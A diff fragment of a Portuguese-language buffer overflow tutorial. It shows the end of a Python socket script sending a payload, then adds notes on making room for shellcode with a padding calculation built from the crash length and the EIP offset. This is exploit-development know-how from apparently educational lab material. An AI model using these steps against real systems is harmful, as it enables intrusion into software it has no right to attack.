@@ -132,3 +132,11 @@ s.recv(1024)
 s.send(payload)
 s.close()
 ```
+
+Agora precisamos encontrar espaco para nossa SHELLCODE, atualmente colocamos no ESP 100 C's, vamos tentar aumentar essa quantidade, utilizando o seguinte calculo "C" * (5000 - 154 - 4) 
+
+```
+-- 5000 <<<< ----- NOSSO CRASH INICIAL
+-- 154  <<<< ----- NOSSO EIP ERA DE 156, MAS SUBTRAIMOS 4 BYTES EQUIVALENTE NOSSOS B's SOBREESCREVENDO O EIP
+-- 4    <<<< ----- EQUIVALENTE OS B's
+```
